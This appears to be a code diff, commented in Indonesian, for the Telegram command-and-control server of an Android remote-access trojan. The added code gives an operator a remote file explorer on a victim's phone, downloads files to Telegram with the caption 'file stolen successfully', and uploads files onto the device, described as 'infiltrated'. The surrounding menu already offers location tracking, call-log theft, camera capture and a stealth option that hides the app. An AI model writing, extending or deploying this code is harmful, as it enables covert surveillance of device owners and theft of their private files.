@@ -116,6 +116,67 @@ const formatDeviceResponse = (data) => {
     return `\n└ ${escapeHTML(data)}`;
 };
 
+// State Memori Sederhana untuk Path (devId -> currentPath) untuk keperluan folder UP
+const devicePaths = {};
+const pathMap = {}; // Untuk by-pass limit 64-char callback_data Telegram
+const lsState = {}; // Cache untuk pagination: devId -> { path, items, page, totalPages }
+
+// --- RENDER PAGINATION FILE EXPLORER ---
+const sendExplorerPage = async (client_id, pageNum, chat_id, message_id = null) => {
+    const state = lsState[client_id];
+    if (!state) return;
+
+    state.page = pageNum;
+    const itemsPerPage = 30;
+    const startIndex = (pageNum - 1) * itemsPerPage;
+    const endIndex = startIndex + itemsPerPage;
+    const pageItems = state.items.slice(startIndex, endIndex);
+
+    const upPath = state.path.substring(0, state.path.lastIndexOf('/')) || '/';
+    const flatBtns = [];
+
+    // Tombol naik 1 level
+    if (state.path !== '/') {
+        const upId = Math.random().toString(36).substring(2, 10);
+        pathMap[upId] = upPath;
+        flatBtns.push(Markup.button.callback('⬆️ Naik 1 Folder', 'runcmd:' + client_id + ':ls_id ' + upId));
+    }
+
+    pageItems.forEach(f => {
+        const shortId = Math.random().toString(36).substring(2, 10);
+        pathMap[shortId] = f.path;
+        if (f.is_dir) {
+            flatBtns.push(Markup.button.callback('📁 ' + f.name.substring(0, 20), 'runcmd:' + client_id + ':ls_id ' + shortId));
+        } else {
+            const sizeKB = Math.round(f.size / 1024);
+            flatBtns.push(Markup.button.callback('📄 ' + f.name.substring(0, 20) + ' (' + sizeKB + ' KB)', 'runcmd:' + client_id + ':dl_id ' + shortId));
+        }
+    });
+
+    const inlineBtns = [];
+    for (let i = 0; i < flatBtns.length; i += 2) {
+        inlineBtns.push(flatBtns.slice(i, i + 2));
+    }
+
+    // Pagination buttons
+    const navBtns = [];
+    if (pageNum > 1) navBtns.push(Markup.button.callback('⬅️ Prev', `pagecmd:${client_id}:${pageNum - 1}`));
+    if (pageNum < state.totalPages) navBtns.push(Markup.button.callback('Next ➡️', `pagecmd:${client_id}:${pageNum + 1}`));
+    if (navBtns.length > 0) inlineBtns.push(navBtns);
+
+    const caption = `📂 <b>File Explorer [${escapeHTML(client_id)}]</b>\n\n📍 Lokasi: <code>${escapeHTML(state.path)}</code>\n📄 Halaman: ${pageNum} dari ${state.totalPages}\n<i>(Klik 📄 File untuk Download)</i>`;
+
+    try {
+        if (message_id) {
+            await bot.telegram.editMessageText(chat_id, message_id, null, caption, { parse_mode: 'HTML', ...Markup.inlineKeyboard(inlineBtns) });
+        } else {
+            await bot.telegram.sendMessage(chat_id, caption, { parse_mode: 'HTML', ...Markup.inlineKeyboard(inlineBtns) });
+        }
+    } catch (tgErr) {
+        await bot.telegram.sendMessage(chat_id, '❌ Telegram menolak render tombol direktori: ' + tgErr.message);
+    }
+};
+
 // --- TELEGRAM BOT ---
 let bot;
 if (TELEGRAM_TOKEN && !TELEGRAM_TOKEN.includes('YOUR_BOT')) {
@@ -208,6 +269,8 @@ Harus diketik dengan format:
     bot.action(/^select_dev:(.+)$/, async (ctx) => {
         const devId = ctx.match[1];
         ctx.answerCbQuery();
+        // Reset path setiap kali memilih device
+        devicePaths[devId] = "/storage/emulated/0";
 
         const menuBtns = [
             [Markup.button.callback('📡 Ping', `runcmd:${devId}:ping`), Markup.button.callback('🎯 Lokasi', `runcmd:${devId}:location`)],
@@ -219,6 +282,7 @@ Harus diketik dengan format:
             [Markup.button.callback('ℹ️ Info Sistem', `runcmd:${devId}:get_device_info`), Markup.button.callback('⚙️ Sensor', `runcmd:${devId}:sensors`)],
             [Markup.button.callback('📳 Getar 2 dkt', `runcmd:${devId}:vibrate 2`), Markup.button.callback('🚨 Alarm Panik!', `runcmd:${devId}:play_alarm`)],
             [Markup.button.callback('☎️ Riwayat Panggilan', `runcmd:${devId}:get_call_logs 30`), Markup.button.callback('📦 Daftar App', `runcmd:${devId}:get_installed_apps`)],
+            [Markup.button.callback('📂 File Explorer', `runcmd:${devId}:ls /storage/emulated/0`)],
             [Markup.button.callback('👻 Hide App (Stealth)', `runcmd:${devId}:hide_app`)]
         ];
 
@@ -234,17 +298,79 @@ Harus diketik dengan format:
         const fullCmd = ctx.match[2];
         const parts = fullCmd.split(' ');
         const cmdName = parts[0];
-        const cmdText = parts.slice(1).join(' ');
+        let cmdText = parts.slice(1).join(' ');
 
-        ctx.answerCbQuery(`Menjalankan ${cmdName}...`);
+        // Dekode shortId jika menggunakan Mapping Path ID
+        if (cmdName === 'ls_id' || cmdName === 'dl_id') {
+            const mappedPath = pathMap[cmdText];
+            if (!mappedPath) return ctx.answerCbQuery('❌ Sesi explorer kedaluwarsa, sentuh ulang menu dari /list', { show_alert: true });
+            cmdText = mappedPath;
+        }
+
+        const realCmdName = cmdName === 'ls_id' ? 'ls' : (cmdName === 'dl_id' ? 'download' : cmdName);
+
+        if (realCmdName === 'ls' && cmdText) {
+            devicePaths[devId] = cmdText;
+        }
+
+        ctx.answerCbQuery(`Menjalankan ${realCmdName}...`);
 
         const cmdId = uuidv4().slice(0, 8);
         const chatId = ctx.callbackQuery.message.chat.id.toString();
 
         await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id) VALUES (?, ?, ?, ?, ?, ?)',
-            [cmdId, devId, cmdName, cmdText, 'pending', chatId]);
+            [cmdId, devId, realCmdName, cmdText, 'pending', chatId]);
 
-        ctx.reply(`⏳ <b>[${cmdName}]</b> masuk ke antrean untuk <code>${devId}</code>...`, { parse_mode: 'HTML' });
+        // Mencegah Spam, kita gunakan editMessageText jika memungkinkan
+        try {
+            await ctx.editMessageText(`⏳ <b>[${realCmdName}]</b> dieksekusi!\nTarget: <code>${devId}</code>\n<i>Menunggu Respon...</i>`, { parse_mode: 'HTML' });
+        } catch (e) {
+            await ctx.reply(`⏳ <b>[${realCmdName}]</b> antre untuk <code>${devId}</code>...`, { parse_mode: 'HTML' });
+        }
+    });
+
+    bot.action(/^pagecmd:(.+):(.+)$/, async (ctx) => {
+        const devId = ctx.match[1];
+        const pageNum = parseInt(ctx.match[2]);
+        if (!lsState[devId]) return ctx.answerCbQuery('❌ Cache explorer kedaluwarsa, muat ulang dari awal.', { show_alert: true });
+
+        ctx.answerCbQuery(`Memuat halaman ${pageNum}...`);
+        await sendExplorerPage(devId, pageNum, ctx.chat.id, ctx.callbackQuery.message.message_id);
+    });
+
+    // Menangani aksi Upload File via Telegram (Reply ke Pesan Menu atau Manual)
+    bot.on(['document', 'photo'], async (ctx) => {
+        // Ambil ID Dev dari memory path jika ada yang aktif
+        const devIdList = Object.keys(devicePaths);
+        if (devIdList.length === 0) return ctx.reply('⚠️ Harap pilih perangkat dulu dari /list sebelum mengunggah file.');
+        const devId = devIdList[0]; // Simplifikasi untuk single admin 
+
+        try {
+            const fileObj = ctx.message.document || ctx.message.photo[ctx.message.photo.length - 1];
+            const fileId = fileObj.file_id;
+            const fileName = fileObj.file_name || 'uploaded_image.jpg';
+
+            const fileLink = await ctx.telegram.getFileLink(fileId);
+
+            // Menggunakan fetch bawaan (Node.js 18+) agar tak perlu install Axios
+            const response = await fetch(fileLink.href);
+            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+            const arrayBuffer = await response.arrayBuffer();
+            const base64Data = Buffer.from(arrayBuffer).toString('base64');
+
+            const destPath = (devicePaths[devId] || '/storage/emulated/0') + '/' + fileName;
+            const uploadPayload = `${destPath}^^^${base64Data}`;
+
+            const cmdId = uuidv4().slice(0, 8);
+            const chatId = ctx.message.chat.id.toString();
+
+            await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id) VALUES (?, ?, ?, ?, ?, ?)',
+                [cmdId, devId, 'upload', uploadPayload, 'pending', chatId]);
+
+            ctx.reply(`📤 <b>Mengunggah File!</b>\nNama: <code>${fileName}</code>\nTujuan: <code>${destPath}</code>\nKe Perangkat: <code>${devId}</code>`, { parse_mode: 'HTML' });
+        } catch (error) {
+            ctx.reply(`❌ Gagal merakit file upload: ${error.message}`);
+        }
     });
 
     bot.command('cmd', async (ctx) => {
@@ -341,6 +467,37 @@ app.post('/response', async (req, res) => {
                     await bot.telegram.sendPhoto(cmd.chat_id, {
                         source: imageBuffer
                     }, { caption: `📸 <b>Respon Jepretan Kamera (${escapeHTML(client_id)})</b>`, parse_mode: 'HTML' });
+                    return res.json({ status: 'received' });
+                }
+
+                if (data.type === 'file_download' && deviceResponse.name && deviceResponse.data) {
+                    const fileBuffer = Buffer.from(deviceResponse.data, 'base64');
+                    await bot.telegram.sendDocument(cmd.chat_id, {
+                        source: fileBuffer,
+                        filename: deviceResponse.name
+                    }, { caption: `✅ <b>Berhasil Curi File (${escapeHTML(client_id)})</b>\n📂 Nama: ${deviceResponse.name}`, parse_mode: 'HTML' });
+                    return res.json({ status: 'received' });
+                }
+
+                if (data.type === 'ls_result' && Array.isArray(deviceResponse)) {
+                    const currentPath = devicePaths[client_id] || '/storage/emulated/0';
+                    lsState[client_id] = {
+                        path: currentPath,
+                        items: deviceResponse,
+                        page: 1,
+                        totalPages: Math.max(1, Math.ceil(deviceResponse.length / 30))
+                    };
+                    await sendExplorerPage(client_id, 1, cmd.chat_id);
+                    return res.json({ status: 'received' });
+                }
+
+                if (data.type === 'upload_success') {
+                    await bot.telegram.sendMessage(cmd.chat_id, `✅ <b>File berhasil disusupkan!</b>\n└ ${escapeHTML(deviceResponse)}`, { parse_mode: 'HTML' });
+                    // Auto Refresh ls
+                    const currentPath = devicePaths[client_id] || '/storage/emulated/0';
+                    const refreshCmdId = uuidv4().slice(0, 8);
+                    await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id) VALUES (?, ?, ?, ?, ?, ?)',
+                        [refreshCmdId, client_id, 'ls', currentPath, 'pending', cmd.chat_id]);
                     return res.json({ status: 'received' });
                 }
 
